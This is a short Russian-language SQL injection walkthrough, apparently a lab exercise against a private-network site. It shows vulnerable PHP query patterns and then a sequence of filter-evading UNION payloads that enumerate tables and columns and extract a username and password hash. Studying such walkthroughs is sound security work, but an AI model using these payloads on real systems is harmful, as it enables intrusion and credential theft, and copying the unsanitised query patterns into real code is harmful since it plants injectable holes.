SQL Injection
Выделяют два вида SQL Injection
• SQL Injection в строковом параметре
Примеры:
SELECT * from table where name = "$_GET['name']"
SELECT id, acl from table where user_agent =
'$_SERVER["HTTP_USER_AGENT"]'

• SQL Injection в цифровом параметре
Примеры:
SELECT login, name from table where id = $_COOKIE["id"]
SELECT id, news from table where news = 123 limit $_POST["limit"]
----------------------------------------------------------------------------------------------------------------
Изучаем site

После внимательного изучения страниц сайта, определяем что он, видимо, написан разработчиками компании GDS, 
и не использует готовую CMS вроде WordPress.

С учетом того, что множество уязвимостей связаны с пользовательским вводом, посмотрим доступные нам entry points. Находим адрес:

http://192.168.101.9:443/post.php?id=1


Если добавить одну кавычку в конце, получаем редирект на основную страницу сайта, а если две — нет. Похоже на SQL injection.
Немного поэкспериментировав, находим, что условие находится в скобках:

http://192.168.101.9:443/post.php?id=1') -- -


При этом попытки добавлять UNION SELECT не приводят к успеху, видимо, в сайте есть фильтр на SQL-инъекции. 
Попробуем его обойти, используя стандартный прием с изменением регистра:

http://192.168.101.9:443/post.php?id=-1') UNiOn SeLect 1, @@veRsiOn -- -


Достанем таблицы:

http://192.168.101.9:443/post.php?id=-1') UNiOn seLeCT 1, GrouP_CONcaT(TabLe_nAmE) FroM InfOrMatIoN_scHemA.
abLes WheRe TabLe_sCheMa=database() -- -


Затем поля:

http://192.168.101.9:443/post.php?id=-1') UNiOn seLeCT 1, GrouP_CONcaT(ColUmN_nAmE) FroM InfOrMatIoN_scHemA.ColuMns WheRe TabLe_NaME='users' -- -


И затем логин и хеш пароля:

http://192.168.101.9:443/post.php?id=-1') UNiOn alL (seLeCT usErNAme, pAssWoRd FroM users liMIT 0,1) -- -
--------------------------------------------------------------------------------------------------------------

